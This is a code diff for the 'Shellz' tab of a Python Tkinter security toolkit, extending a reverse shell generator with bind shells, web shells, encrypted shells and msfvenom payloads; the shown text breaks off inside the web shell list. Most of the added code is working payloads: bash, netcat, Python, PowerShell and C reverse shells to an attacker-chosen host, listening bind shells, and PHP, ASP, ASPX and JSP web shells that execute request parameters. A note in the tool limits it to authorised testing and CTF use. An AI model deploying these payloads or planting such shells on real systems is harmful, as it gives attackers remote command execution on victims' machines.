@@ -5430,50 +5430,163 @@ Adjustable:  Yes (via Settings)
         return frame
 
     def create_shellz_tab(self):
-        """Create the Shellz tab for reverse shell generation."""
+        """Create the Shellz tab for shell generation (reverse, bind, web, encrypted, msfvenom)."""
         frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
         frame.columnconfigure(1, weight=1)
 
         # Header
         header = tk.Label(
             frame,
-            text="🐚 REVERSE SHELL GENERATOR",
+            text="🐚 SHELL GENERATOR",
             font=("Courier", 14, "bold"),
             fg=self.accent_cyan,
             bg=self.bg_secondary
         )
         header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=15)
 
+        # Shell Category dropdown
+        cat_label = tk.Label(frame, text="Shell Category:", font=("Courier", 10),
+                            fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        cat_label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)
+
+        self.shellz_category = ttk.Combobox(frame, values=[
+            "Reverse Shells",
+            "Bind Shells",
+            "Web Shells",
+            "Encrypted Shells",
+            "MSFVenom Payloads"
+        ], font=("Courier", 10), state="readonly", width=25)
+        self.shellz_category.grid(row=1, column=1, sticky=tk.W, padx=10, pady=5)
+        self.shellz_category.current(0)
+        self.shellz_category.bind("<<ComboboxSelected>>", self.update_shell_types)
+
         # IP Address
-        self.shellz_ip = self.create_labeled_entry(frame, "LHOST (Your IP):", 1, "")
+        self.shellz_ip = self.create_labeled_entry(frame, "LHOST (Your IP):", 2, "")
 
         # Port
-        self.shellz_port = self.create_labeled_entry(frame, "LPORT:", 2, "4444")
+        self.shellz_port = self.create_labeled_entry(frame, "LPORT:", 3, "4444")
 
         # Shell type dropdown
-        label = tk.Label(frame, text="Shell Type:", font=("Courier", 10),
+        type_label = tk.Label(frame, text="Shell Type:", font=("Courier", 10),
                         fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
-        label.grid(row=3, column=0, sticky=tk.W, padx=10, pady=5)
+        type_label.grid(row=4, column=0, sticky=tk.W, padx=10, pady=5)
 
-        self.shellz_type = ttk.Combobox(frame, values=[
-            "Bash TCP",
-            "Bash UDP",
-            "Netcat Traditional",
-            "Netcat OpenBSD",
-            "Netcat BusyBox",
-            "Python",
-            "Python3",
-            "Perl",
-            "PHP",
-            "Ruby",
-            "Java",
-            "PowerShell",
-            "PowerShell Base64",
-            "Socat",
-            "Awk",
-            "Lua"
-        ], font=("Courier", 10), state="readonly", width=25)
-        self.shellz_type.grid(row=3, column=1, sticky=tk.W, padx=10, pady=5)
+        # Define shell types for each category
+        self.shell_type_options = {
+            "Reverse Shells": [
+                "Bash TCP",
+                "Bash UDP",
+                "Netcat Traditional",
+                "Netcat OpenBSD",
+                "Netcat BusyBox",
+                "Netcat Windows",
+                "Python",
+                "Python3",
+                "Python Windows",
+                "Perl",
+                "Perl Windows",
+                "PHP",
+                "PHP exec",
+                "PHP passthru",
+                "Ruby",
+                "Ruby Windows",
+                "Java",
+                "Java Runtime",
+                "PowerShell",
+                "PowerShell Base64",
+                "PowerShell SSL",
+                "Socat",
+                "Socat TTY",
+                "Awk",
+                "Lua",
+                "Node.js",
+                "Groovy",
+                "Telnet",
+                "Zsh",
+                "Golang",
+                "C (Linux)",
+                "C (Windows)"
+            ],
+            "Bind Shells": [
+                "Netcat Bind",
+                "Netcat Bind (Windows)",
+                "Python Bind",
+                "Python3 Bind",
+                "Perl Bind",
+                "PHP Bind",
+                "Ruby Bind",
+                "Socat Bind",
+                "Socat Bind TTY",
+                "PowerShell Bind",
+                "Node.js Bind",
+                "Awk Bind"
+            ],
+            "Web Shells": [
+                "PHP Simple",
+                "PHP System",
+                "PHP Passthru",
+                "PHP Shell_exec",
+                "PHP Backtick",
+                "PHP popen",
+                "PHP proc_open",
+                "PHP Full Featured",
+                "PHP Upload",
+                "PHP File Manager",
+                "ASP CMD",
+                "ASP.NET CMD",
+                "ASPX CMD",
+                "ASPX Full",
+                "JSP CMD",
+                "JSP Runtime",
+                "JSP ProcessBuilder",
+                "WAR Shell Info",
+                "CGI Bash",
+                "CGI Perl",
+                "CGI Python",
+                "Node.js Express"
+            ],
+            "Encrypted Shells": [
+                "OpenSSL Reverse",
+                "OpenSSL Bind",
+                "Ncat SSL Reverse",
+                "Ncat SSL Bind",
+                "Socat SSL Reverse",
+                "Socat SSL Bind",
+                "Python SSL Reverse",
+                "PowerShell SSL Reverse",
+                "Bash /dev/tcp SSL"
+            ],
+            "MSFVenom Payloads": [
+                "Linux x86 Reverse",
+                "Linux x64 Reverse",
+                "Linux x86 Bind",
+                "Linux x64 Bind",
+                "Linux x86 Meterpreter",
+                "Linux x64 Meterpreter",
+                "Windows x86 Reverse",
+                "Windows x64 Reverse",
+                "Windows x86 Bind",
+                "Windows x64 Bind",
+                "Windows x86 Meterpreter",
+                "Windows x64 Meterpreter",
+                "Windows x64 Meterpreter HTTPS",
+                "PHP Meterpreter",
+                "Python Meterpreter",
+                "Java Meterpreter",
+                "ASP Meterpreter",
+                "ASPX Meterpreter",
+                "JSP Meterpreter",
+                "WAR Meterpreter",
+                "macOS x64 Reverse",
+                "macOS x64 Bind",
+                "Android Meterpreter",
+                "NodeJS Reverse"
+            ]
+        }
+
+        self.shellz_type = ttk.Combobox(frame, values=self.shell_type_options["Reverse Shells"],
+                                        font=("Courier", 10), state="readonly", width=25)
+        self.shellz_type.grid(row=4, column=1, sticky=tk.W, padx=10, pady=5)
         self.shellz_type.current(0)
 
         # Generate button
@@ -5488,23 +5601,23 @@ Adjustable:  Yes (via Settings)
             padx=20,
             pady=10,
             cursor="hand2",
-            command=self.generate_reverse_shell
+            command=self.generate_shell
         )
-        gen_btn.grid(row=4, column=0, columnspan=2, padx=10, pady=15)
+        gen_btn.grid(row=5, column=0, columnspan=2, padx=10, pady=15)
 
         # Output area
         output_label = tk.Label(frame, text="Generated Shell:", font=("Courier", 10, "bold"),
                                fg=self.accent_cyan, bg=self.bg_secondary)
-        output_label.grid(row=5, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))
+        output_label.grid(row=6, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))
 
         self.shellz_output = scrolledtext.ScrolledText(
-            frame, height=8, font=("Consolas", 11),
+            frame, height=10, font=("Consolas", 11),
             bg="#1E1E1E", fg=self.accent_green,
             insertbackground=self.accent_green,
             selectbackground=self.accent_yellow,
             wrap=tk.WORD, relief=tk.FLAT
         )
-        self.shellz_output.grid(row=6, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)
+        self.shellz_output.grid(row=7, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)
 
         # Copy button
         copy_btn = tk.Button(
@@ -5521,46 +5634,533 @@ Adjustable:  Yes (via Settings)
             cursor="hand2",
             command=lambda: self.copy_to_clipboard(self.shellz_output.get("1.0", tk.END))
         )
-        copy_btn.grid(row=7, column=0, columnspan=2, pady=10)
+        copy_btn.grid(row=8, column=0, columnspan=2, pady=10)
+
+        # Info label
+        info_label = tk.Label(
+            frame,
+            text="For authorized penetration testing and CTF challenges only",
+            font=("Courier", 8),
+            fg=self.text_muted,
+            bg=self.bg_secondary
+        )
+        info_label.grid(row=9, column=0, columnspan=2, pady=5)
 
         return frame
 
-    def generate_reverse_shell(self):
-        """Generate a reverse shell based on selected parameters."""
+    def update_shell_types(self, event=None):
+        """Update shell type dropdown based on selected category."""
+        category = self.shellz_category.get()
+        shell_types = self.shell_type_options.get(category, [])
+        self.shellz_type['values'] = shell_types
+        if shell_types:
+            self.shellz_type.current(0)
+
+    def generate_shell(self):
+        """Generate a shell based on selected category and type."""
         ip = self.shellz_ip.get().strip()
         port = self.shellz_port.get().strip()
+        category = self.shellz_category.get()
         shell_type = self.shellz_type.get()
 
-        if not ip or not port:
-            messagebox.showerror("Error", "Please enter IP address and port")
-            return
+        # Web shells don't always need IP/port
+        if category != "Web Shells":
+            if not ip or not port:
+                messagebox.showerror("Error", "Please enter IP address and port")
+                return
 
-        shells = {
-            "Bash TCP": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
-            "Bash UDP": f"bash -i >& /dev/udp/{ip}/{port} 0>&1",
-            "Netcat Traditional": f"nc -e /bin/bash {ip} {port}",
-            "Netcat OpenBSD": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
-            "Netcat BusyBox": f"rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
-            "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
-            "Python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
-            "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
-            "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
-            "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
-            "Java": f"Runtime r = Runtime.getRuntime();\nProcess p = r.exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\");\np.waitFor();",
-            "PowerShell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
-            "PowerShell Base64": self.generate_ps_base64(ip, port),
-            "Socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
-            "Awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
-            "Lua": f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
-        }
+        shell_cmd = ""
 
-        shell_cmd = shells.get(shell_type, "")
+        if category == "Reverse Shells":
+            shell_cmd = self.get_reverse_shell(ip, port, shell_type)
+        elif category == "Bind Shells":
+            shell_cmd = self.get_bind_shell(port, shell_type)
+        elif category == "Web Shells":
+            shell_cmd = self.get_web_shell(shell_type)
+        elif category == "Encrypted Shells":
+            shell_cmd = self.get_encrypted_shell(ip, port, shell_type)
+        elif category == "MSFVenom Payloads":
+            shell_cmd = self.get_msfvenom_payload(ip, port, shell_type)
+
         self.shellz_output.delete("1.0", tk.END)
         self.shellz_output.insert("1.0", shell_cmd)
 
+    def generate_reverse_shell(self):
+        """Legacy method - calls generate_shell for backwards compatibility."""
+        self.generate_shell()
+
+    def get_reverse_shell(self, ip, port, shell_type):
+        """Get reverse shell payload based on type."""
+        shells = {
+            # Bash shells
+            "Bash TCP": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+            "Bash UDP": f"bash -i >& /dev/udp/{ip}/{port} 0>&1",
+
+            # Netcat shells
+            "Netcat Traditional": f"nc -e /bin/bash {ip} {port}",
+            "Netcat OpenBSD": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
+            "Netcat BusyBox": f"rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
+            "Netcat Windows": f"nc.exe {ip} {port} -e cmd.exe",
+
+            # Python shells
+            "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+            "Python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+            "Python Windows": f"python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])\"",
+
+            # Perl shells
+            "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
+            "Perl Windows": f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
+
+            # PHP shells
+            "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+            "PHP exec": f"php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
+            "PHP passthru": f"php -r '$sock=fsockopen(\"{ip}\",{port});while($cmd=fgets($sock)){{passthru($cmd,$ret);fputs($sock,\"ret:$ret\\n\");}}'",
+
+            # Ruby shells
+            "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+            "Ruby Windows": f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
+
+            # Java shells
+            "Java": f"Runtime r = Runtime.getRuntime();\nProcess p = r.exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\");\np.waitFor();",
+            "Java Runtime": f"String[] cmd = {{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"}};\nRuntime.getRuntime().exec(cmd);",
+
+            # PowerShell shells
+            "PowerShell": f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
+            "PowerShell Base64": self.generate_ps_base64(ip, port),
+            "PowerShell SSL": f"$client = New-Object Net.Sockets.TcpClient(\"{ip}\",{port});$ssl = New-Object System.Net.Security.SslStream($client.GetStream(),$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));$ssl.AuthenticateAsClient(\"\");$w = New-Object IO.StreamWriter($ssl);$w.AutoFlush=$true;$r = New-Object IO.StreamReader($ssl);while(($cmd = $r.ReadLine()) -ne \"exit\"){{$out = (iex $cmd 2>&1 | Out-String);$w.WriteLine($out)}};$client.Close()",
+
+            # Socat shells
+            "Socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
+            "Socat TTY": f"socat tcp-connect:{ip}:{port} exec:\"bash -li\",pty,stderr,setsid,sigint,sane",
+
+            # Other shells
+            "Awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
+            "Lua": f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
+            "Node.js": f"require('child_process').exec('nc -e /bin/sh {ip} {port}')",
+            "Groovy": f"String host=\"{ip}\";\nint port={port};\nString cmd=\"/bin/bash\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}};p.destroy();s.close();",
+            "Telnet": f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF",
+            "Zsh": f"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
+            "Golang": f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
+            "C (Linux)": f"// Compile: gcc -o shell shell.c\n#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n\nint main() {{\n    int sock = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in addr;\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons({port});\n    addr.sin_addr.s_addr = inet_addr(\"{ip}\");\n    connect(sock, (struct sockaddr *)&addr, sizeof(addr));\n    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);\n    execve(\"/bin/sh\", NULL, NULL);\n    return 0;\n}}",
+            "C (Windows)": f"// Compile: x86_64-w64-mingw32-gcc -o shell.exe shell.c -lws2_32\n#include <winsock2.h>\n#include <stdio.h>\n#pragma comment(lib,\"ws2_32\")\n\nWSADATA wsaData;\nSOCKET s;\nstruct sockaddr_in addr;\nSTARTUPINFO si;\nPROCESS_INFORMATION pi;\n\nint main() {{\n    WSAStartup(MAKEWORD(2,2), &wsaData);\n    s = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons({port});\n    addr.sin_addr.s_addr = inet_addr(\"{ip}\");\n    WSAConnect(s,(SOCKADDR*)&addr,sizeof(addr),NULL,NULL,NULL,NULL);\n    memset(&si,0,sizeof(si));\n    si.cb = sizeof(si);\n    si.dwFlags = STARTF_USESTDHANDLES;\n    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;\n    CreateProcess(NULL,\"cmd.exe\",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);\n    return 0;\n}}"
+        }
+        return shells.get(shell_type, "# Shell type not found")
+
+    def get_bind_shell(self, port, shell_type):
+        """Get bind shell payload based on type."""
+        shells = {
+            "Netcat Bind": f"nc -lvnp {port} -e /bin/bash",
+            "Netcat Bind (Windows)": f"nc.exe -lvnp {port} -e cmd.exe",
+            "Python Bind": f"python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+            "Python3 Bind": f"python3 -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+            "Perl Bind": f"perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,pack(\"l\",1));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){{open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");}};'",
+            "PHP Bind": f"php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});socket_listen($s,1);$c=socket_accept($s);while(1){{$cmd=socket_read($c,2048);$out=shell_exec($cmd);socket_write($c,$out,strlen($out));}}'",
+            "Ruby Bind": f"ruby -rsocket -e 'f=TCPServer.new({port});c=f.accept;c.each_line{{|l|c.puts `#{{l}}`}}'",
+            "Socat Bind": f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash",
+            "Socat Bind TTY": f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
+            "PowerShell Bind": f"$listener = [System.Net.Sockets.TcpListener]{port};$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()",
+            "Node.js Bind": f"require('net').createServer(function(c){{var sh=require('child_process').spawn('/bin/sh',[]);c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}}).listen({port});",
+            "Awk Bind": f"awk 'BEGIN{{s=\"/inet/tcp/{port}/0/0\";for(;;){{do{{if((s|&getline c)<=0)break;if(c){{while((c|&getline)>0)print|&s;close(c)}}}}while(c!=\"exit\");close(s)}}}}'"
+        }
+        return shells.get(shell_type, "# Shell type not found")
+
+    def get_web_shell(self, shell_type):
+        """Get web shell payload based on type."""
+        shells = {
+            # PHP Web Shells
+            "PHP Simple": "<?php system($_GET['cmd']); ?>",
+            "PHP System": "<?php echo system($_REQUEST['cmd']); ?>",
+            "PHP Passthru": "<?php passthru($_GET['cmd']); ?>",
+            "PHP Shell_exec": "<?php echo shell_exec($_GET['cmd']); ?>",
+            "PHP Backtick": "<?php echo `$_GET['cmd']`; ?>",
+            "PHP popen": "<?php $handle = popen($_GET['cmd'], 'r'); echo fread($handle, 2096); pclose($handle); ?>",
+            "PHP proc_open": """<?php
+$descriptorspec = array(
+   0 => array("pipe", "r"),
+   1 => array("pipe", "w"),
+   2 => array("pipe", "w")
+);
+$process = proc_open($_GET['cmd'], $descriptorspec, $pipes);
+echo stream_get_contents($pipes[1]);
+proc_close($process);
+?>""",
+            "PHP Full Featured": """<?php
+// Usage: ?cmd=whoami or POST cmd=whoami
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    echo htmlspecialchars(shell_exec($cmd));
+    echo "</pre>";
+}
+if(isset($_REQUEST['upload'])){
+    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+    echo "File uploaded";
+}
+?>
+<!-- Upload: <form method="POST" enctype="multipart/form-data"><input type="file" name="file"><input type="submit" name="upload" value="Upload"></form> -->""",
+            "PHP Upload": """<?php
+if(isset($_FILES['file'])){
+    $target = basename($_FILES['file']['name']);
+    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)){
+        echo "Uploaded: $target";
+    }
+}
+?>
+<form method="POST" enctype="multipart/form-data">
+<input type="file" name="file"><input type="submit" value="Upload">
+</form>""",
+            "PHP File Manager": """<?php
+$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+echo "<h3>$dir</h3><ul>";
+foreach(scandir($dir) as $f){
+    if($f != '.' && $f != '..'){
+        $path = "$dir/$f";
+        echo is_dir($path) ? "<li><a href='?dir=$path'>[$f]</a></li>" : "<li>$f</li>";
+    }
+}
+echo "</ul>";
+if(isset($_GET['cmd'])) echo "<pre>".shell_exec($_GET['cmd'])."</pre>";
+?>""",
+
+            # ASP Web Shells
+            "ASP CMD": """<%
+Dim cmd
+Set cmd = Server.CreateObject("WScript.Shell")
+Dim output
+output = cmd.Exec("cmd /c " & Request("cmd")).StdOut.ReadAll()
+Response.Write("<pre>" & output & "</pre>")
+%>""",
+            "ASP.NET CMD": """<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%
+string cmd = Request["cmd"];
+if(!string.IsNullOrEmpty(cmd)){
+    Process p = new Process();
+    p.StartInfo.FileName = "cmd.exe";
+    p.StartInfo.Arguments = "/c " + cmd;
+    p.StartInfo.UseShellExecute = false;
+    p.StartInfo.RedirectStandardOutput = true;
+    p.Start();
+    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
+}
+%>""",
+
+            # ASPX Web Shells
+            "ASPX CMD": """<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<script runat="server">
+protected void Page_Load(object sender, EventArgs e){
+    if(Request["cmd"] != null){
+        ProcessStartInfo psi = new ProcessStartInfo();
+        psi.FileName = "cmd.exe";
+        psi.Arguments = "/c " + Request["cmd"];
+        psi.RedirectStandardOutput = true;
+        psi.UseShellExecute = false;
+        Process p = Process.Start(psi);
+        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
+    }
+}
+</script>""",
+            "ASPX Full": """<%@ Page Language="C#" Debug="true" Trace="false" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<script Language="c#" runat="server">
+void Page_Load(object sender, EventArgs e){
+    string cmd = Request.QueryString["cmd"];
+    if(cmd != null){
+        Process p = new Process();
+        p.StartInfo.FileName = "cmd.exe";
+        p.StartInfo.Arguments = "/c " + cmd;
+        p.StartInfo.UseShellExecute = false;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.StartInfo.RedirectStandardError = true;
+        p.Start();
+        output.Text = "<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()) + "</pre>";
+    }
+}
+</script>
+<html><body>
+<form method="GET">Command: <input type="text" name="cmd" size="50"><input type="submit" value="Run"></form>
+<asp:Literal id="output" runat="server"/>
+</body></html>""",
+
+            # JSP Web Shells
+            "JSP CMD": """<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+if(cmd != null){
+    Process p = Runtime.getRuntime().exec(cmd);
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    out.print("<pre>");
+    while((line = br.readLine()) != null){ out.println(line); }
+    out.print("</pre>");
+}
+%>""",
+            "JSP Runtime": """<%@ page import="java.io.*,java.util.*" %>
+<%
+String cmd = request.getParameter("cmd");
+if(cmd != null){
+    String[] cmds = {"/bin/sh", "-c", cmd};
+    if(System.getProperty("os.name").toLowerCase().contains("win")){
+        cmds = new String[]{"cmd", "/c", cmd};
+    }
+    Process p = Runtime.getRuntime().exec(cmds);
+    Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\\\A");
+    out.print("<pre>" + (s.hasNext() ? s.next() : "") + "</pre>");
+}
+%>
+<form method="GET">Cmd: <input name="cmd"><input type="submit"></form>""",
+            "JSP ProcessBuilder": """<%@ page import="java.io.*,java.util.*" %>
+<%
+if(request.getParameter("cmd") != null){
+    ProcessBuilder pb;
+    if(System.getProperty("os.name").toLowerCase().contains("win")){
+        pb = new ProcessBuilder("cmd", "/c", request.getParameter("cmd"));
+    } else {
+        pb = new ProcessBuilder("/bin/sh", "-c", request.getParameter("cmd"));
+    }
+    pb.redirectErrorStream(true);
+    Process p = pb.start();
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    out.print("<pre>");
+    while((line = br.readLine()) != null) out.println(line);
+    out.print("</pre>");
+}
+%>""",
+            "WAR Shell Info": """# To create a WAR shell:
+# 1. Create index.jsp with JSP shell code
+# 2. Create WEB-INF/web.xml with basic config
+# 3. Package: jar -cvf shell.war index.jsp WEB-INF/web.xml
+# 4. Deploy to Tomcat manager or copy to webapps/
+
+# web.xml content:
+<?xml version="1.0"?>
+<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
+  <welcome-file-list>
+    <welcome-file>index.jsp</welcome-file>
+  </welcome-file-list>
+</web-app>""",
+
